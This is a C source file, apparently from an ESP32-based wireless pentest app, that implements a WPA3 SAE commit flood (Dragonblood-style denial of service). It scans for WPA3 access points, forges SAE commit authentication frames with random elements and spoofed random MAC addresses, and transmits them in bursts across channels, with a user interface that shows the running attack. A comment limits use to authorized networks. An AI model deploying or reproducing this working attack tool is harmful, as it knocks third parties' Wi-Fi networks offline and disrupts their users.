#include "../wlan_app.h"
#include "../views/wlan_sae_flood_view.h"
#include <wlan_hal.h>
#include <wlan_passwords.h>
#include <esp_log.h>
#include <esp_wifi.h>
#include <string.h>
#include <stdbool.h>
#include <stdlib.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/idf_additions.h>
#include <esp_heap_caps.h>
#include <esp_attr.h>

#define SAE_TAG "WlanSaeFlood"

// ============================================================================
// WPA3 SAE-Commit-Flood (Dragonblood-DoS)
// ----------------------------------------------------------------------------
// SAE (Dragonfly, WPA3) läuft über 802.11-AUTHENTICATION-Frames (nicht EAPOL).
// Ein SAE-Commit zwingt den AP zu einer teuren EC-Operation (Element dekodieren,
// On-Curve-Check, Shared-Secret). Viele Commits von wechselnden Quell-MACs →
// CPU-Last am AP. Nur gegen eigene/autorisierte Netze verwenden.
//
// Wirkungsgrad hängt von der AP-Implementierung ab: Anti-Clogging-Token
// (RFC 7664) kann blindes Spoofed-MAC-Fluten auf gehärteten APs abfedern;
// wirksam v.a. gegen schwache/alte SAE-Implementierungen.
// ============================================================================

#define SAE_GROUP_P256        19U   // Finite Cyclic Group 19 (NIST P-256)
#define SAE_SCALAR_LEN        32U   // Ordnung r von P-256 = 32 Byte
#define SAE_ELEMENT_LEN       64U   // unkomprimierter Punkt: x||y = 2*32
#define SAE_HDR_LEN           24U   // 802.11 MAC-Header
#define SAE_FIXED_LEN         6U    // Auth-Algo(2)+Seq(2)+Status(2)
#define SAE_GROUP_FIELD_LEN   2U
#define SAE_FRAME_LEN \
    (SAE_HDR_LEN + SAE_FIXED_LEN + SAE_GROUP_FIELD_LEN + SAE_SCALAR_LEN + SAE_ELEMENT_LEN) // 128

#define SAE_WIFI_CH_MIN       1U
#define SAE_WIFI_CH_MAX       13U
#define SAE_MIN_RSSI          -90
#define SAE_SCAN_PASSES       2U
#define SAE_SCAN_RETRY_MS     150U
#define SAE_BURST_PER_AP      8U    // Commits je AP pro Kanal-Dwell
#define SAE_FRAME_GAP_MS      1U
#define SAE_CH_SETTLE_MS      30U
#define SAE_POST_AP_DWELL_MS  3U
#define SAE_CH_EMPTY_DWELL_MS 2U
#define SAE_UI_REFRESH_MS     250U
#define SAE_BLE_SETTLE_MS     300U
#define SAE_WIFI_SETTLE_MS    200U
#define SAE_EXIT_WAIT_MAX_MS  2000U

// ---- State (getrennt von Deauth-All, damit beide unabhängig laufen) --------
static TaskHandle_t      s_sae_task     = NULL;
static volatile bool     s_sae_run      = false;
static volatile bool     s_sae_done     = true;
static volatile bool     s_sae_scanning = false;
static volatile bool     s_sae_cancel   = false;
static EXT_RAM_BSS_ATTR WlanApRecord s_sae_aps[WLAN_APP_MAX_APS];
static volatile uint16_t s_sae_count    = 0;
static volatile uint32_t s_sae_frames   = 0;
static volatile uint8_t  s_sae_channel  = SAE_WIFI_CH_MIN;
static bool              s_sae_scene_active = false;
static uint16_t          s_sae_seq      = 0;
static uint32_t          s_sae_rng      = 0x12345678u;

extern int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c);
static inline bool sae_lib_is_patched(void) {
    return ieee80211_raw_frame_sanity_check(0xC0, 0, 0) == 0;
}

// xorshift32 — reicht für MAC/Payload-Randomisierung (keine Krypto-Ansprüche).
static inline uint32_t sae_rand(void) {
    uint32_t x = s_sae_rng;
    x ^= x << 13; x ^= x >> 17; x ^= x << 5;
    s_sae_rng = x ? x : 0x1u;
    return s_sae_rng;
}

static bool sae_authmode_is_sae(uint8_t a) {
    switch(a) {
    case WIFI_AUTH_WPA3_PSK:
    case WIFI_AUTH_WPA2_WPA3_PSK:
    case WIFI_AUTH_WPA3_ENT_192:
    case WIFI_AUTH_WPA3_EXT_PSK:
    case WIFI_AUTH_WPA3_EXT_PSK_MIXED_MODE:
    case WIFI_AUTH_WPA3_ENTERPRISE:
        return true;
    default:
        return false;
    }
}

static inline void sae_write_seq_ctrl(uint8_t* buf, uint16_t seq) {
    uint16_t s = seq & 0x0FFF;
    buf[22] = (uint8_t)((s & 0x0F) << 4);
    buf[23] = (uint8_t)((s >> 4) & 0xFF);
}

static void sae_random_mac(uint8_t mac[6]) {
    uint32_t a = sae_rand(), b = sae_rand();
    mac[0] = (uint8_t)a; mac[1] = (uint8_t)(a >> 8);
    mac[2] = (uint8_t)(a >> 16); mac[3] = (uint8_t)(a >> 24);
    mac[4] = (uint8_t)b; mac[5] = (uint8_t)(b >> 8);
    mac[0] = (uint8_t)((mac[0] | 0x02) & 0xFE); // locally-administered, unicast
}

// Baut einen SAE-Commit-Auth-Frame: Ziel = AP (BSSID), Quelle = random MAC.
static void sae_build_commit(uint8_t* buf, const uint8_t* bssid, const uint8_t* src_mac) {
    memset(buf, 0, SAE_FRAME_LEN);
    buf[0] = 0xB0; buf[1] = 0x00;          // FC: Mgmt, Subtype Authentication
    buf[2] = 0x3A; buf[3] = 0x01;          // Duration
    memcpy(&buf[4], bssid, 6);             // Addr1 (DA)   = AP
    memcpy(&buf[10], src_mac, 6);          // Addr2 (SA)   = gespoofte MAC
    memcpy(&buf[16], bssid, 6);            // Addr3 (BSSID)= AP
    sae_write_seq_ctrl(buf, s_sae_seq++);  // Seq-Control (22,23)
    // Auth-Body @24
    buf[24] = 0x03; buf[25] = 0x00;        // Auth-Algo = 3 (SAE)
    buf[26] = 0x01; buf[27] = 0x00;        // Transaction = 1 (Commit)
    buf[28] = 0x00; buf[29] = 0x00;        // Status = 0
    buf[30] = (uint8_t)SAE_GROUP_P256; buf[31] = 0x00; // Finite Cyclic Group
    // Scalar (32) + Element (64): random — erzwingt Decode/On-Curve-Versuch am AP.
    for(uint16_t i = 32; i < SAE_FRAME_LEN; i += 4) {
        uint32_t r = sae_rand();
        buf[i] = (uint8_t)r;
        if(i + 1 < SAE_FRAME_LEN) buf[i + 1] = (uint8_t)(r >> 8);
        if(i + 2 < SAE_FRAME_LEN) buf[i + 2] = (uint8_t)(r >> 16);
        if(i + 3 < SAE_FRAME_LEN) buf[i + 3] = (uint8_t)(r >> 24);
    }
}

static uint16_t sae_channel_mask(void) {
    uint16_t mask = 0;
    for(uint16_t i = 0; i < s_sae_count; i++) {
        uint8_t ch = s_sae_aps[i].channel;
        if(ch >= SAE_WIFI_CH_MIN && ch <= SAE_WIFI_CH_MAX) mask |= (uint16_t)(1u << ch);
    }
    return mask;
}

// Scan + Filter auf SAE/WPA3-APs (dedup by BSSID, union über Passes).
static void sae_scan(void) {
    s_sae_count = 0;
    if(!wlan_hal_is_started()) {
        if(!wlan_hal_start()) return;
    }
    for(uint16_t pass = 0; pass < SAE_SCAN_PASSES && !s_sae_cancel; pass++) {
        wifi_ap_record_t* raw = NULL;
        uint16_t found = 0;
        wlan_hal_scan_cancellable(&raw, &found, WLAN_APP_MAX_APS, &s_sae_cancel);
        if(s_sae_cancel) { if(raw) free(raw); return; }
        if(raw && found > 0) {
            for(uint16_t i = 0; i < found && s_sae_count < WLAN_APP_MAX_APS; i++) {
                if(raw[i].rssi < SAE_MIN_RSSI) continue;
                if(!sae_authmode_is_sae(raw[i].authmode)) continue;
                bool dup = false;
                for(uint16_t j = 0; j < s_sae_count; j++) {
                    if(memcmp(s_sae_aps[j].bssid, raw[i].bssid, 6) == 0) { dup = true; break; }
                }
                if(dup) continue;
                WlanApRecord* r = &s_sae_aps[s_sae_count++];
                memset(r, 0, sizeof(*r));
                strncpy(r->ssid, (const char*)raw[i].ssid, sizeof(r->ssid) - 1);
                r->ssid[sizeof(r->ssid) - 1] = '\0';
                memcpy(r->bssid, raw[i].bssid, 6);
                r->rssi = raw[i].rssi;
                r->channel = raw[i].primary;
                r->authmode = raw[i].authmode;
            }
        }
        if(raw) free(raw);
        if((uint16_t)(pass + 1) < SAE_SCAN_PASSES) vTaskDelay(pdMS_TO_TICKS(SAE_SCAN_RETRY_MS));
    }
    ESP_LOGI(SAE_TAG, "scan: %u SAE/WPA3 AP(s)", (unsigned)s_sae_count);
}

static void sae_flood_task_fn(void* arg) {
    UNUSED(arg);
    s_sae_scanning = true;

    if(!wlan_hal_is_started()) {
        vTaskDelay(pdMS_TO_TICKS(SAE_BLE_SETTLE_MS));
        if(!wlan_hal_start()) {
            ESP_LOGE(SAE_TAG, "wlan_hal_start failed");
            s_sae_scanning = false; s_sae_run = false; s_sae_done = true;
            vTaskDeleteWithCaps(NULL);
        }
        vTaskDelay(pdMS_TO_TICKS(SAE_WIFI_SETTLE_MS));
        if(!s_sae_run) { s_sae_scanning = false; s_sae_done = true; vTaskDeleteWithCaps(NULL); }
    }

    if(wlan_hal_is_connected()) wlan_hal_disconnect();

    uint8_t mac[6] = {0};
    if(wlan_hal_get_own_mac(mac)) {
        s_sae_rng ^= ((uint32_t)mac[3] << 24) ^ ((uint32_t)mac[4] << 8) ^ mac[5] ^ xTaskGetTickCount();
    } else {
        s_sae_rng ^= (uint32_t)xTaskGetTickCount();
    }
    if(s_sae_rng == 0) s_sae_rng = 0x1u;

    wlan_hal_set_promiscuous(false, NULL);

    sae_scan();
    s_sae_scanning = false;
    if(!s_sae_run) { s_sae_done = true; vTaskDelay(pdMS_TO_TICKS(10)); vTaskDeleteWithCaps(NULL); }

    s_sae_seq = 0;
    uint16_t mask = sae_channel_mask();
    s_sae_channel = SAE_WIFI_CH_MIN;
    uint32_t cycle = 0;
    static uint8_t frame[SAE_FRAME_LEN];

    ESP_LOGI(SAE_TAG, "flood start: targets=%u mask=0x%04X", (unsigned)s_sae_count, (unsigned)mask);

    while(s_sae_run) {
        wlan_hal_set_channel(s_sae_channel);
        vTaskDelay(pdMS_TO_TICKS(SAE_CH_SETTLE_MS));

        bool any_here = false;
        for(uint16_t i = 0; i < s_sae_count && s_sae_run; i++) {
            if(s_sae_aps[i].channel != s_sae_channel) continue;
            any_here = true;
            for(uint16_t b = 0; b < SAE_BURST_PER_AP && s_sae_run; b++) {
                uint8_t src[6];
                sae_random_mac(src);
                sae_build_commit(frame, s_sae_aps[i].bssid, src);
                if(wlan_hal_raw_tx_retry(frame, SAE_FRAME_LEN)) s_sae_frames++;
                vTaskDelay(pdMS_TO_TICKS(SAE_FRAME_GAP_MS));
            }
            vTaskDelay(pdMS_TO_TICKS(SAE_POST_AP_DWELL_MS));
        }
        if(!any_here) vTaskDelay(pdMS_TO_TICKS(SAE_CH_EMPTY_DWELL_MS));

        cycle++;
        if((cycle % 30) == 0) {
            ESP_LOGI(SAE_TAG, "cycle=%lu ch=%u frames=%lu",
                     (unsigned long)cycle, (unsigned)s_sae_channel, (unsigned long)s_sae_frames);
        }

        // Nächster Kanal: nur solche mit SAE-APs anspringen (Maske), sonst der Reihe nach.
        if(mask != 0) {
            uint8_t start = s_sae_channel;
            do {
                s_sae_channel++;
                if(s_sae_channel > SAE_WIFI_CH_MAX) s_sae_channel = SAE_WIFI_CH_MIN;
                if(s_sae_channel == start) break;
            } while(((mask >> s_sae_channel) & 1u) == 0);
        } else {
            // Keine SAE-APs gefunden → nichts zu fluten; kurz warten, Scene zeigt Status.
            vTaskDelay(pdMS_TO_TICKS(200));
        }
    }

    ESP_LOGI(SAE_TAG, "task exit (frames=%lu)", (unsigned long)s_sae_frames);
    s_sae_scanning = false;
    s_sae_run = false;
    s_sae_done = true;
    vTaskDelay(pdMS_TO_TICKS(10));
    vTaskDeleteWithCaps(NULL);
}

static bool sae_worker_start(void) {
    if(s_sae_run && !s_sae_done) return true;
    if(!s_sae_done) return false;

    s_sae_frames = 0;
    s_sae_count = 0;
    s_sae_channel = SAE_WIFI_CH_MIN;
    s_sae_scanning = false;
    s_sae_run = true;
    s_sae_done = false;
    s_sae_cancel = false;
    s_sae_seq = 0;

    // PSRAM-Stack (BT kann beim Start noch resident sein → interner 8-KB-Stack
    // würde mit ENOMEM scheitern). esp_wifi_* läuft nicht auf diesem Stack
    // (raw-TX wird an den WlanHal-Worker dispatcht). Self-Delete via WithCaps.
    BaseType_t rc = xTaskCreatePinnedToCoreWithCaps(
        sae_flood_task_fn, "WlanSaeFlood", 8192, NULL, 5, &s_sae_task,
        FURI_CORE_ID_SECONDARY, MALLOC_CAP_SPIRAM);
    if(rc != pdPASS) {
        s_sae_run = false;
        s_sae_done = true;
        s_sae_task = NULL;
        return false;
    }
    return true;
}

static void sae_worker_stop(void) {
    if(s_sae_done) { s_sae_task = NULL; return; }
    s_sae_cancel = true;
    s_sae_run = false;
}

static void sae_toggle_run(WlanApp* app) {
    bool running = false;
    with_view_model(app->view_sae_flood, WlanSaeFloodModel * m, { running = m->running; }, false);

    if(!running) {
        if(sae_worker_start()) {
            with_view_model(app->view_sae_flood, WlanSaeFloodModel * m, { m->running = true; }, true);
        } else {
            with_view_model(
                app->view_sae_flood, WlanSaeFloodModel * m,
                {
                    strncpy(m->status, "TASK FAIL", sizeof(m->status) - 1);
                    m->status[sizeof(m->status) - 1] = '\0';
                },
                true);
        }
    } else {
        with_view_model(app->view_sae_flood, WlanSaeFloodModel * m, { m->running = false; }, true);
        sae_worker_stop();
    }
}

void wlan_app_scene_sae_flood_on_enter(void* context) {
    WlanApp* app = context;
    s_sae_scene_active = true;
    s_sae_frames = 0;
    s_sae_channel = SAE_WIFI_CH_MIN;

    with_view_model(
        app->view_sae_flood,
        WlanSaeFloodModel * model,
        {
            model->running = false;
            model->frames = 0;
            model->current_channel = SAE_WIFI_CH_MIN;
            model->elapsed_ms = 0;
            model->targets = 0;
            if(!sae_lib_is_patched()) {
                strncpy(model->status, "LIB UNPATCHED", sizeof(model->status) - 1);
            } else {
                strncpy(model->status, "READY: scan WPA3", sizeof(model->status) - 1);
            }
            model->status[sizeof(model->status) - 1] = '\0';
        },
        true);

    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewSaeFlood);
}

bool wlan_app_scene_sae_flood_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == WlanAppCustomEventSaeFloodOk) {
            sae_toggle_run(app);
            consumed = true;
        }
    }

    if(event.type == SceneManagerEventTypeTick) {
        bool alive = s_sae_run && !s_sae_done;
        with_view_model(
            app->view_sae_flood,
            WlanSaeFloodModel * model,
            {
                if(alive) {
                    if(s_sae_scanning) {
                        strncpy(model->status, "SCANNING...", sizeof(model->status) - 1);
                    } else if(s_sae_count == 0) {
                        strncpy(model->status, "NO WPA3 APS", sizeof(model->status) - 1);
                    } else {
                        snprintf(model->status, sizeof(model->status) - 1,
                                 "FLOOD %u WPA3", (unsigned)s_sae_count);
                    }
                    model->status[sizeof(model->status) - 1] = '\0';
                    model->targets = s_sae_count;
                    model->frames = s_sae_frames;
                    model->current_channel = s_sae_channel;
                    model->elapsed_ms += SAE_UI_REFRESH_MS;
                } else if(model->running) {
                    model->running = false;
                    strncpy(model->status, "STOPPED", sizeof(model->status) - 1);
                    model->status[sizeof(model->status) - 1] = '\0';
                }
            },
            true);
        consumed = true;
    }

    return consumed;
}

void wlan_app_scene_sae_flood_on_exit(void* context) {
    WlanApp* app = (WlanApp*)context;
    s_sae_scene_active = false;

    sae_worker_stop();
    uint32_t timeout = SAE_EXIT_WAIT_MAX_MS / 10;
    while(!s_sae_done && timeout > 0) {
        vTaskDelay(pdMS_TO_TICKS(10));
        timeout--;
    }
    if(!s_sae_done) ESP_LOGW(SAE_TAG, "exit timeout — force clearing handle");
    s_sae_task = NULL;
    s_sae_scanning = false;

    // Raw-TX-SoftAP wieder abbauen (die TX-Helfer schalten beim ersten Frame auf
    // APSTA; bliebe er an, beaconnt ein verstecktes AP bis zum Reboot) und — falls
    // vorher eine STA-Verbindung bestand — zum letzten Netz zurückverbinden
    // (globales WiFi soll über App-Grenzen bestehen, vgl. scene_deauth_all).
    wlan_hal_set_ap_mode(false);
    if(app->connected) {
        char pw[WLAN_APP_PASSWORD_MAX] = {0};
        wlan_password_read(app->connected_ap.ssid, pw, sizeof(pw));
        wlan_hal_connect(
            app->connected_ap.ssid, pw, app->connected_ap.bssid, app->connected_ap.channel);
    }
}
